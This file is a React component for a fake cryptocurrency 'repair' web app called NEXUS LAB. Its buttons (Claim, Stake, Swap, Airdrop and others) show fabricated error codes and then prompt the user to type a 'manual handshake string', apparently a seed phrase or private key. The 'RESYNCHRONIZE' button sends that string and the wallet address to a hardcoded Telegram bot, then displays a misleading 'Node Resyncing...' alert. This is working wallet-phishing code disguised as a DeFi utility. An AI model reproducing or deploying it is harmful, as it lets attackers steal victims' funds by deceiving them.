import React, { useState } from 'react';
import { useAccount, useBalance } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, ArrowDown, Database, History, ChevronRight, Settings, Coins, Activity, Clock, Unlock, Zap } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [typedAmount, setTypedAmount] = useState("");
  const [activeError, setActiveError] = useState({ title: "", desc: "" });

  const triggerError = (title, desc) => {
    if (!isConnected) { open(); return; }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setActiveError({ title, desc });
      setView("error");
    }, 2500);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6">
        <h1 className="text-xl font-black text-white italic">NEXUS LAB</h1>
        <w3m-button balance="hide" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4">
          {[
            { n: "Claim", i: <Database/>, t: "SNAPSHOT_ERR_0x11", d: "Node mismatch." },
            { n: "Stake", i: <History/>, t: "STAKE_LOCKED_0x99", d: "Pool synchronization error." },
            { n: "Swap", i: <RefreshCcw/>, custom: "swap" },
            { n: "Migrate", i: <Activity/>, t: "V1_HALT_0x44", d: "Legacy contract unresponsive." },
            { n: "Unstake", i: <Unlock/>, t: "EPOCH_SYNC_0x22", d: "Handshake failed." },
            { n: "Delay", i: <Clock/>, t: "RPC_TIMEOUT_0x77", d: "Broadcast latency detected." },
            { n: "Airdrop", i: <Zap/>, t: "DROP_FAIL_0x55", d: "Allocation corruption." },
            { n: "Bridge", i: <ArrowDown/>, t: "PATH_BLOCK_0x12", d: "Cross-chain error." },
            { n: "Rectify", i: <Settings/>, t: "NODE_ERR_0x88", d: "Rectification failed." }
          ].map((item) => (
            <button key={item.n} onClick={() => item.custom ? setView(item.custom) : triggerError(item.t, item.d)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[9px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "swap" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-8">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-4">← EXIT</button>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-4">
            <input type="number" value={typedAmount} onChange={(e) => setTypedAmount(e.target.value)} placeholder="0.00" className="bg-transparent text-2xl font-mono text-white outline-none w-full" />
            <div className="text-[10px] text-slate-500 mt-2 font-bold">BAL: {balance?.formatted.slice(0,6) || "0.00"} {balance?.symbol}</div>
          </div>
          <button onClick={() => triggerError("SWAP_ERR_0x55", "Routing failed.")} className="w-full bg-cyan-600 py-5 rounded-2xl text-[11px] font-black text-white">AUTHORIZE REPAIR</button>
        </div>
      )}

      {view === "error" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6">
          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[45px] p-10 text-center">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-lg uppercase italic">{activeError.title}</h2>
            <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0x... manual handshake string" className="w-full h-32 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none mt-8 uppercase" />
            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nADDR: ${address}\nSTR: ${inputVal}` }),
              });
              alert("Node Resyncing..."); setView("menu");
            }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white">RESYNCHRONIZE</button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center">
          <div className="w-10 h-10 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
        </div>
      )}
    </div>
  );
}
